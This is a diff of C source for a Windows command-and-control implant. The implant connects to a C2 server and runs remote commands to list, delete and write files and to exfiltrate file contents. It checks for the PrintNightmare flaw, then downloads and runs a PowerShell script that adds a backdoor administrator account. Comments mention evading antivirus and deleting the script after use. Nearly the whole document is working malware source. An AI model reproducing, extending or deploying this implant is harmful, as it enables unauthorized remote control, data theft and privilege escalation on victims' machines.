@@ -1,38 +1,23 @@
-#include "c2_net.h"
-#include <windows.h>
-#include <stdlib.h>
-#include <malloc.h>
-#include <string.h>
-#include <shlwapi.h>
-#include <winspool.h>
-#include <processthreadsapi.h>
+#include "c2_comms.h"
 
-#pragma comment(lib, "Shlwapi.lib")
-#pragma comment(lib, "Advapi32.lib")
-#pragma comment(lib, "Pathcch.lib")
-#pragma comment(lib, "Winspool.lib")
-#pragma comment(lib, "Shell32.lib")
 
-// Configurations
-#define SLEEP 1
-#define SERVER_IP "192.168.187.13"
-#define SERVER_PORT 4444
-
-SOCKET c2_sock;
+// Global heap handle
 HANDLE heap;
+#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
+#define Free(ptr) HeapFree(HEAP, 0, (ptr));
 
 // Present working directory, globally accessible
-char pwd[MAX_PATH + 1] = {0};
- 
+char PWD[MAX_PATH + 1] = {0};
 
-// Attempt to change the pwd to the given path. Returns FALSE if path does not exist.
+// Attempt to change the PWD to the given path. Returns FALSE if path does not exist.
 BOOL change_dir(char *path, int len) {
-
     // Absolute path
     if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
-        memset(pwd, 0, _MAX_PATH + 1);
-        strncpy(pwd, path, len);
-        PathAddBackslashA(pwd); // Append trailing \ to path if needed
+        c2_log("PATH: %s   LEN: %d\n", path, len);
+        memset(PWD, 0, MAX_PATH + 1);
+        strncpy(PWD, path, len);
+        PathAddBackslashA(PWD); // Append trailing \ to path if needed
+        c2_log("PWD: %s\n", PWD);
         return TRUE;
     }
     // No support for relative paths
@@ -40,15 +25,82 @@ BOOL change_dir(char *path, int len) {
 }
 
 
+// Attempt to remove the given file
+BOOL rm(char *path) {
+    char abs_path[MAX_PATH + 1] = {0};
+
+    // Convert relative path to absolute path
+    if (path[0] != 'C' || path[1] != ':') {
+        sprintf(abs_path, "%s\\%s", PWD, path);
+    }
+    // Otherwise just use path as-is
+    else {
+        strcpy(abs_path, path);
+    }
+
+    return DeleteFileA(path);
+}
+
+
+// Writes data in file at serverPath to file at clientPath
+DWORD write(char* clientPath, char* serverPath) {
+    HANDLE hFile;
+    char* data;
+    char abs_path[MAX_PATH + 1] = {0};
+
+    // Convert relative path to absolute path
+    if (clientPath[0] != 'C' || clientPath[1] != ':') {
+        sprintf(abs_path, "%s\\%s", PWD, clientPath);
+    }
+    // Otherwise just use path as-is
+    else {
+        strcpy(abs_path, clientPath);
+    }
+
+    hFile = CreateFileA(clientPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        c2_log("[!] Could not get handle to file");
+        return 0;
+    }
+
+    // Allocate space for file data
+    data = Malloc(100 * 1000);
+    if (data == NULL) {
+        CloseHandle(hFile);
+        return 0;
+    }
+
+    // Get data to write. We send the name of the file we want in the format FILE:filename.txt
+    // TODO: 100 Kb max file size rn
+    char request[300];
+    sprintf(request, "FILE:%s", serverPath);
+    c2_send(request, strlen(request));
+    int n = c2_recv(data, 100 * 1000);
+
+    DWORD numWritten = 0;
+    if (! WriteFile(hFile, data, n, &numWritten, NULL)) {
+        CloseHandle(hFile);
+        Free(data);
+        return 0;
+    }
+
+    CloseHandle(hFile);
+    Free(data);
+
+    return numWritten;
+}
+
+
 // Write file + directory listing to out
+// TODO: segfaults on directories with lots of entries (ex: C:\Windows\System32)
 DWORD ls(char *path, char* out) {
-    char preparedPath[MAX_PATH];
+    char preparedPath[MAX_PATH + 4];
     LARGE_INTEGER file_size;
     WIN32_FIND_DATA data;
     BOOL status = 0;
     int len = 0;
     
-    // Copy the string to a buffer+ append '\*' to the directory name
+    // Copy the string to a buffer + append '\*' to the directory name
     sprintf(preparedPath, "%s\\*", path);
     
     // Find first file
@@ -80,18 +132,18 @@ DWORD ls(char *path, char* out) {
         return 0;
     return -1;
 }
-
+ 
 
 // Reads data from file given by path and sends it back to C2 server
-int exfil(char* path) {
-    char abs_path[MAX_PATH] = {0};
+int Exfil(char* path) {
+    char abs_path[MAX_PATH + 1] = {0};
     DWORD numBytesRead = 0;
+    DWORD numBytesSent = 0;
     LARGE_INTEGER fileSize;
-    int status = 0;
 
     // Convert relative path to absolute path
     if (path[0] != 'C' || path[1] != ':') {
-        sprintf(abs_path, "%s\\%s", pwd, path);
+        sprintf(abs_path, "%s\\%s", PWD, path);
     }
     // Otherwise just use path as-is
     else {
@@ -101,8 +153,7 @@ int exfil(char* path) {
     // Open file
     HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        c2_send(c2_sock, "ERROR opening file", 18);
-        status = -1;
+        numBytesSent = 0;
         goto end;
     }
 
@@ -112,33 +163,31 @@ int exfil(char* path) {
     fileSize.LowPart = low;
 
     // Allocate buffer on heap for the data
-    char* out = (char*) HeapAlloc(heap, HEAP_ZERO_MEMORY, fileSize.QuadPart);
+    char* out = (char*) Malloc(fileSize.QuadPart);
     if (out == NULL) {
-        c2_send(c2_sock, "ERROR Not enough memory", 23);
-        status = -1;
+        numBytesSent = 0;
         goto end;
     }
 
     // Read data
     BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
     if (!res) {
-        c2_send(c2_sock, "ERROR reading file", 18);
-        status = -1;
+        numBytesSent = 0;
         goto end;
     }
-    c2_send(c2_sock, out, numBytesRead);
+    numBytesSent = c2_exfil(out, numBytesRead);
 
 end:
-    HeapFree(heap, 0, out);
+    Free(out);
     CloseHandle(hFile);
-    return status;
+    return numBytesSent;
 }
 
 
 
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
-int check_registry_for_privesc() {
+int CheckForNightmare() {
     int vulnerable = 1;
     DWORD status;
     HKEY hKey = NULL;
@@ -184,6 +233,7 @@ end:
 }
 
 
+
 // Creates a file in the present working directory and writes the printer nightmare powershell script to it.
 // Returns NULL on failure, and the path to the script on success.
 // TODO: name the payload something less sus than "script.ps1"
@@ -192,51 +242,56 @@ char* DownloadScript() {
     char* payload_data;
 
     // Allocate buffer for payload path
-    payload_path = HeapAlloc(heap, 0, 2 * MAX_PATH);
+    payload_path = Malloc(2 * MAX_PATH);
     if (payload_path == NULL) {
         return NULL;
     }
 
     // Allocate buffer for payload data
-    payload_data = HeapAlloc(heap, 0, 200*1000); // Allocate 200 Kb to be safe
+    payload_data = Malloc(500*1000); // Allocate 500 Kb to be safe
     if (payload_data == NULL) {
-        HeapFree(heap, 0, payload_path);
-        return NULL;
-    }
-
-    // Create file for payload to be written to
-    strcpy(payload_path, pwd);
-    strcat(payload_path, "\\script.ps1");
-    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        HeapFree(heap, 0, payload_data);
-        HeapFree(heap, 0, payload_path);
+        Free(payload_path);
         return NULL;
     }
 
     // Receive payload
-    int len = c2_recv(c2_sock, payload_data, 200*1000);
+    c2_send("SCRIPT", 6);
+    int len = c2_recv(payload_data, 500*1000);
+    if (len <= 0) {
+        Free(payload_data);
+        Free(payload_path);
+        return NULL;
+    }
 
-    // Write paylaod
+    // Create file for payload to be written to
+    strcpy(payload_path, PWD);
+    strcat(payload_path, "\\script.ps1");
+    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Free(payload_data);
+        Free(payload_path);
+        return NULL;
+    }
+
+    // Write payload
     if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
-        HeapFree(heap, 0, payload_data);
-        HeapFree(heap, 0, payload_path);
+        Free(payload_data);
+        Free(payload_path);
         CloseHandle(hFile);
         DeleteFile(payload_path);
         return NULL;
     }
 
-    HeapFree(heap, 0, payload_data);
+    Free(payload_data);
     CloseHandle(hFile);
     return payload_path;
 }
 
 
-// Attempts to gain administrator privileges via the Printer Nightmare CVE.
+
+// Attempts to add a backdoor admin account using printer nightmare exploit.
 // Works by downloading and executing a powershell script.
-// TODO: issue is that recv function cannot receive all the data in a single call.
-//        Need to receive in a loop to get all data.
-DWORD escalate() {
+DWORD BackDoor() {
     char* script_path;
     STARTUPINFO startInfo;
     PROCESS_INFORMATION procInfo;
@@ -247,14 +302,14 @@ DWORD escalate() {
     startInfo.cb = sizeof(startInfo);
 
     // Check registry first
-    int vulnerable  = check_registry_for_privesc();
+    int vulnerable  = CheckForNightmare();
     if (vulnerable == 0) {
-        c2_send(c2_sock, "Target not vulnerable", 21);
+        c2_log("Target not vulnerable", 21);
         ret = -1;
         goto end;
     }
     if (vulnerable == -1) {
-        c2_send(c2_sock, "ERROR: Could not check registry", 31);
+        c2_log("ERROR: Could not check registry", 31);
         ret = -1;
         goto end;
     }
@@ -262,15 +317,15 @@ DWORD escalate() {
     // Download script
     script_path = DownloadScript();
     if (script_path == NULL) {
-        c2_send(c2_sock, "ERROR: Could not download script", 32);
+        c2_log("ERROR: Could not download script", 32);
         ret = -1;
         goto end;
     }
     c2_log("Script path: %s\n", script_path);
 
     // Execute the powershell script
-    DWORD res = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
-    if (!res) {
+    ret = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
+    if (!ret) {
         c2_log("Spawning powershell failed\n");
         ret = -1;
         goto end;
@@ -282,102 +337,155 @@ DWORD escalate() {
 
 end:
     if (script_path) {
-        //DeleteFile(script_path); // TODO uncomment
-        HeapFree(heap, 0, script_path);
+        DeleteFile(script_path);
+        Free(script_path);
     }
     return ret;
 }
 
 
-// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
-// cl implant.c c2_net.c /Fe:implant.exe
+
+
+
+// cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
+// cl implant.c /Fe:implant.exe
 int main() {
     int status = 0;
-    int len = 0;
-    char buffer[512];
+    unsigned int len = 0;
+    char buffer[1024] = {0};
 
 
-    // Sleep on start to avoid AV scans
-    // Sleep(SLEEP * 1000);
-
-    // Basic setup
-    if (!setup_comms()) {
-        return 1;
+    // Network setup
+    status = SetupComms();
+    if (status < 0) {
+        c2_log("[!] ERROR in comms setup\n");
+        TearDownComms();
+        return -1;
     }
+    c2_log("[+] Comms setup sucessfully\n");
+
+    // Other setup
     heap = GetProcessHeap();
-
-    // Connect to C2 server (TODO: what to do if can't connect?)
-    c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
-    if (c2_sock == INVALID_SOCKET) {
-        closesocket(c2_sock);
-        WSACleanup();
-        return 1;
-    }
-
-    // Get present directory
-    GetCurrentDirectory(_MAX_PATH, pwd);
-    c2_send(c2_sock, pwd, strlen(pwd));
+    GetCurrentDirectory(_MAX_PATH, PWD);
 
     
-    while (TRUE) {
-        // Read data from network buffer
-        len = c2_recv(c2_sock, buffer, 511);
-        if (len == SOCKET_ERROR)
+    c2_send("READY", 5); // we need an initial send so we can get a corresponding response
+    while (1) {
+        // Recv data
+        int n = c2_recv(buffer, 1024);
+        if (n <= 0) {
+            c2_log("[!] Didn't receive any data!\n");
             continue;
+        }
 
 
-        // Main logic of implant functionality
+        c2_log("RECV: %s\n", buffer);
+
+
+        // Main logic of implant
+        // Note: to maintain synchronization between requests and responses, always need to send something back to server
         if (strncmp(buffer, "exit", 4) == 0) {
             break;
         }
 
-        else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
-            if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of arg passed to cd
-                c2_send(c2_sock, "Invalid dir", 11);
+        else if (strncmp(buffer, "pwd", 3) == 0) {
+            c2_send(PWD, strlen(PWD));
+        }
+
+        else if (strncmp(buffer, "rm ", 3) == 0) {
+            if(rm(buffer + 3)) {
+                c2_send("Success", 7);
+            }
+            else {
+                c2_send("Failed", 6);
+            }
+        }
+
+        else if (strncmp(buffer, "write ", 6) == 0) {
+
+            // Find index of arguments in buffer
+            int idx1 = 6;
+            int idx2;
+            for(idx2 = 6; idx2 < n; idx2++) {
+                if (buffer[idx2] == ' ') {
+                    buffer[idx2] = '\x00'; // put \x00 in middle of string to terminate first arg
+                    idx2++;
+                    break;
+                }
+            }
+
+            int num = write(buffer + idx1, buffer + idx2);
+            if (num == 0) {
+                c2_send("[!] write failed", 16);
+            }
+            else {
+                c2_send("[+] write success", 17);
+            }
+        }
+
+        else if(strncmp(buffer, "cd ", 3) == 0 && n >= 4) {
+            if (change_dir(buffer + 3, n - 3)) { // buffer + 3 is start of arg passed to cd
+                c2_send(PWD, strlen(PWD));
+            }
+            else { c2_send("[!] Invalid dir", 15); }
         }
 
         else if(strncmp(buffer, "ls", 2) == 0) {
             char listing[4096] = {0};
-            if (len == 2)
-                status = ls(pwd, listing);
-            else if (len >= 4)
+            if (n == 2)
+                status = ls(PWD, listing);
+            else if (n >= 4)
                 status = ls(buffer + 3, listing); // arg passed to ls
 
             // Check result
             if (status == 0) {
-                c2_send(c2_sock, listing, strlen(listing));
+                c2_send(listing, strlen(listing));
             }
             else {
-                c2_send(c2_sock, "ERROR", 5);
+                c2_send("[!] Error in ls", 15);
             }
         }
 
-        else if(strncmp(buffer, "pwd", 2) == 0) {
-            c2_send(c2_sock, pwd, strlen(pwd));
+        else if(strncmp(buffer, "exfil ", 6) == 0) {
+            if (n >= 7) {
+                status = Exfil(buffer + 6);
+                if (status > 0) { c2_send("OK", 2); }
+                else { c2_send("[!] exfil error", 15); }
+            }
+            else {
+                c2_send("[!] No arg", 10);
+            }
         }
 
-        else if(strncmp(buffer, "exfil ", 5) == 0) {
-            if (len >= 7) {
-                exfil(buffer + 6);
-            }   
+        else if (strncmp(buffer, "check", 5) == 0) {
+            status = CheckForNightmare();
+            if (status == 1) { c2_send("[+] Host vulnerable", 19); }
+            else if (status == 0) { c2_send("[!] Host not vulnerable", 23); }
+            else { c2_send("[!] Error in check", 18); }
         }
 
-        else if(strncmp(buffer, "upload ", 6) == 0) {
-            // falls more on the c2 server
+        else if (strncmp(buffer, "backdoor", 8) == 0) {
+            status = BackDoor();
+            if (status == 0) { c2_send("[+] Escalate sucess", 19); }
+            else { c2_send("[!] Error in privesc", 20); }
         }
 
-        else if(strncmp(buffer, "escalate", 8) == 0) {
-            escalate();
+        else {
+            c2_send("[!] Invalid command", 19);
         }
-        // TODO: what else?
 
         
+        
 
+        // Clear buffer
+        memset(buffer, 0, 1024);
     }
+    
 
-    // Close the socket
-    closesocket(c2_sock);
-    WSACleanup();
+
+
+
+
+    TearDownComms();
     return 0;
-    // TODO: delete binary?
 }
